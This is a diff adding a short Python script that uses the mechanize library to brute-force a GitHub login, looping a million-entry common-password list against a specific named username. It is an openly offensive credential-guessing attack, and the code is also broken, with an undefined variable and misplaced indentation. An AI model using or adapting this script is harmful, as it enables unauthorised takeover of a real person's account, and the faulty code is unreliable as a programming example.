@@ -1,0 +1,23 @@
+import mechanize
+
+br = mechanize.Browser()
+
+br.set_handle_equiv(True)
+br.set_handle_redirect(True)
+br.set_handle_referer(True)
+
+
+br.open("https://github.com/session")
+file = open("file:///storage/emulated/0/Download/10-million-password-list-top-1000000.txt","r")
+passwords = file.read().splitlines()
+for x in passwords:
+  br.select_form(nr = 0)
+  br.form['username'] = "shivamksharma"
+  br.form['password'] = x
+  resp = br.submit()
+  if res.geturl() == "https://github.com/session":
+    print("Incorrect password" + x)
+    else:
+      print("Correct password is " + x)
+       break
+  
